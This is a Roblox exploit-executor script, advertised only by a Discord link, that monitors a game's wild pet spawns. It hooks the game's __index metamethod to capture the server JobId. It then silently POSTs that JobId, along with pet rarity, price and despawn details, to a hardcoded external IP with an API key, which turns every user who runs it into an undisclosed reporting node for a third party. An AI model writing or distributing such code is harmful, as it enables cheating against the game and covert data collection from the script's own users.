-- discord.gg/syncrypt

if not getgenv().AWDAS then
	task.spawn(function()
		getgenv().AWDAS = true

		local s1 = "http://5.129.216.75:8765/alert"
		local s2 = "http://5.129.216.75:8766/job/visit"
		local s3 = "Do-not-nothing-in-this-string"
		local t1 = {}
		local s4 = "PR_GAG2_LocalWild"
		local u6

		local function v7()
			local jobId

			if not hookmetamethod or ExploitName == "volt" or ExploitName == "velocity" then
				return game.JobId
			end

			local v9

			v9 = hookmetamethod(game, "__index", function(p1, p2)
				if not jobId and not checkcaller() then
					jobId = v9(game, "JobId")
				end

				return v9(p1, p2)
			end)

			repeat
				task.wait(0.1)
			until jobId ~= nil

			return jobId
		end
		local function v10(p3)
			local http_request_ = http_request or request

			http_request_ = http_request_ or HttpPost or syn.request

			if not http_request_ then
				return
			end

			local HttpService = game:GetService("HttpService")

			task.spawn(function()
				http_request_({
					Url = s2,
					Method = "POST",
					Headers = {
						["content-type"] = "application/json",
						["x-api-key"] = s3
					},
					Body = HttpService:JSONEncode({
						job_id = p3
					})
				})
			end)
		end

		task.spawn(function()
			v10(v7())
		end)

		local function v13(p4)
			if u6 then
				return u6
			end

			local n1 = 0

			for _, v in p4, nil, nil do
				if type(v) == "table" and type(v.SpawnChance) == "number" and v.SpawnChance > 0 then
					n1 += v.SpawnChance
				end
			end

			u6 = n1

			return n1
		end
		local function v17(p5, p6)
			local v18 = p6[p5]

			if type(v18) ~= "table" or type(v18.SpawnChance) ~= "number" or v18.SpawnChance <= 0 then
				return nil
			end

			local v19 = v13(p6)

			if v19 <= 0 then
				return nil
			end

			return v18.SpawnChance / v19 * 100
		end
		local function v20(p7)
			if type(p7) ~= "string" or p7 == "" then
				return nil
			end

			if p7:find("http", 1, true) then
				return p7
			end

			return p7:match("rbxassetid://(%d+)") or p7:match("^(%d+)$")
		end
		local function v21(p8)
			local v22 = v20(p8)

			if not v22 then
				return nil
			end

			if v22:find("http", 1, true) then
				return v22
			end

			local http_request_ = http_request or request or HttpPost or syn.request

			if not http_request_ then
				return nil
			end

			local HttpService = game:GetService("HttpService")
			local v25 = ("https://thumbnails.roblox.com/v1/assets?assetIds=%*&size=420x420&format=Png&isCircular=false"):format(v22)

			for i = 1, 4 do
				local ok, result = pcall(function()
					return http_request_({
						Url = v25,
						Method = "GET"
					})
				end)

				if ok and result and result.StatusCode == 200 then
					local ok2, result2 = pcall(function()
						return HttpService:JSONDecode(result.Body)
					end)

					if ok2 and result2 and result2.data and result2.data[1] then
						local v31 = result2.data[1]

						if v31.state == "Completed" and v31.imageUrl and v31.imageUrl ~= "" then
							return v31.imageUrl
						end

						if v31.state ~= "Pending" then
							break
						end

						task.wait(0.35)
					end
				end

				task.wait(0.1)
			end

			return nil
		end
		local function v32(p9)
			local Map = workspace:FindFirstChild("Map")
			local WildPetSpawns = Map and Map:FindFirstChild("WildPetSpawns")

			if not WildPetSpawns then
				return nil
			end

			local v35 = "_" .. p9.Name

			for _, v in WildPetSpawns:GetChildren() do
				if v.Name:sub(-#v35) == v35 then
					return v
				end
			end

			return nil
		end
		local function v38(p10)
			if p10:GetAttribute(s4) ~= nil then
				return true
			end

			local v39 = v32(p10)

			if not v39 then
				return false
			end

			if v39:GetAttribute(s4) ~= nil then
				return true
			end

			for _, v in v39:GetDescendants() do
				if v:GetAttribute(s4) == nil then
					continue
				end

				return true
			end

			return false
		end
		local function v42(p11)
			local attribute = p11:GetAttribute("PetName")

			if type(attribute) == "string" then
				if attribute ~= "" then
					return attribute
				end
			end

			return nil
		end
		local function v44(p12, p13, p14, p15)
			local v45 = p14[p13]
			local attribute = p12:GetAttribute("Rarity")

			if type(attribute) ~= "string" or attribute == "" then
				attribute = v45 and v45.Rarity or "Common"
			end

			local attribute2 = p12:GetAttribute("SpawnedAt")
			local attribute3 = p12:GetAttribute("Lifetime")
			local v49
			local v50

			if type(attribute2) == "number" and type(attribute3) == "number" then
				v49 = attribute2 + attribute3
				v50 = v49 - os.time()
			end

			local attribute4 = p12:GetAttribute("Price")
			local attribute5 = p12:GetAttribute("PetSize")
			local attribute6 = p12:GetAttribute("PetType")
			local Value = p14.GetImage(p13, attribute5)

			if Value == "" and p15 then
				local v55 = p15:FindFirstChild(p13)

				if v55 and v55:IsA("StringValue") then
					Value = v55.Value
				end
			end

			return {
				petName = p13,
				displayName = p14.GetDisplayName(p13, attribute5),
				rarity = attribute,
				spawnChance = v17(p13, p14),
				image = Value,
				petSize = type(attribute5) == "string" and attribute5 ~= "" and attribute5 or nil,
				petType = type(attribute6) == "string" and attribute6 ~= "" and attribute6 or nil,
				price = type(attribute4) == "number" and attribute4 or nil,
				despawnAt = v49,
				timeLeft = v50
			}
		end
		local function v56(p16, p17, p18)
			local HttpService = game:GetService("HttpService")
			local petType = p16.petType and p17.GetDisplayText(p16.petType) or "Normal"
			local petSize = p16.petSize and p18.DisplaySize(p16.petSize) or "Normal"
			local v60 = v21(p16.image)
			local t2 = {
				pet_name = p16.petName,
				display_name = p16.displayName,
				rarity = p16.rarity,
				mutation = petType,
				size = petSize,
				pet_size = p16.petSize or "",
				pet_type = p16.petType or "",
				spawn_chance = p16.spawnChance,
				price = p16.price,
				despawn_at = p16.despawnAt,
				place_id = game.PlaceId,
				job_id = game.JobId,
				image_url = v60 or ""
			}
			local http_request_ = http_request or request or HttpPost or syn.request

			if not http_request_ then
				return
			end

			http_request_({
				Url = s1,
				Body = HttpService:JSONEncode(t2),
				Method = "POST",
				Headers = {
					["content-type"] = "application/json",
					["x-api-key"] = s3
				}
			})
		end
		local function v63(p19, p20, p21, p22, p23)
			if p19:IsA("BasePart") and not t1[p19] then
				task.spawn(function()
					for i = 1, 50 do
						if not p19.Parent then
							return
						end

						if v38(p19) then
							t1[p19] = true

							return
						end

						local v65 = v42(p19)

						if not v65 then
							task.wait(0.1)

							continue
						end

						t1[p19] = true
						v56(v44(p19, v65, p20, p21), p22, p23)

						return
					end
				end)

				return
			end
		end
		local function v66(p24, p25, p26, p27, p28)
			local function v67()
				for _, v in p24:GetChildren() do
					v63(v, p25, p26, p27, p28)
				end
			end

			v67()
			p24.ChildAdded:Connect(function(child)
				v63(child, p25, p26, p27, p28)
			end)
			task.spawn(function()
				local n2 = 1
				local n3 = 45
				local v72 = 1 - n2

				while true do
					v72 += n2

					if n2 <= 0 then
						if not (v72 >= n3) then
							break
						end

						v67()
						task.wait(1)

						continue
					end

					if not (v72 <= n3) then
						break
					end

					v67()
					task.wait(1)
				end
			end)
		end

		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local SharedModules = ReplicatedStorage:WaitForChild("SharedModules", 60)
		local SharedData = ReplicatedStorage:WaitForChild("SharedData", 60)
		local PetData = require(SharedData:WaitForChild("PetData"))
		local PetTypes = require(SharedData:WaitForChild("PetTypes"))
		local PetSizes = require(SharedData:WaitForChild("PetSizes"))
		local GearImages = SharedModules:WaitForChild("GearImages")

		task.spawn(function()
			local Map = workspace:WaitForChild("Map", 30)

			if not Map then
				return
			end

			local WildPetRef = Map:FindFirstChild("WildPetRef")

			if WildPetRef and WildPetRef:IsA("Folder") then
				v66(WildPetRef, PetData, GearImages, PetTypes, PetSizes)
			else
				Map.ChildAdded:Connect(function(child)
					if child.Name == "WildPetRef" then
						if child:IsA("Folder") then
							v66(child, PetData, GearImages, PetTypes, PetSizes)
						end
					end
				end)
			end
		end)
	end)
end
